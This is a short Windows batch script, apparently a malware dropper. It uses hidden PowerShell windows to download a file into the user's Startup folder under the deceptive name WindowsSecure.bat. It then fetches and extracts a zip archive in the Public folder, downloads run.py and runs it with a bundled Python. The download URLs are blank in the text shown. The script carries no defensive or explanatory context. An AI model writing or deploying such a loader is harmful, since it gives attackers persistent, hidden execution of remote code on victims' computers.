@echo off
setlocal
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat";
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI  -OutFile C:\\Users\\Public\\Document.zip;
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Expand-Archive C:\\Users\\Public\\Document.zip -DestinationPath C:\\Users\\Public\\Document;
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI  -OutFile C:\\Users\\Public\\Document\\run.py;
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\run.py;
endlocal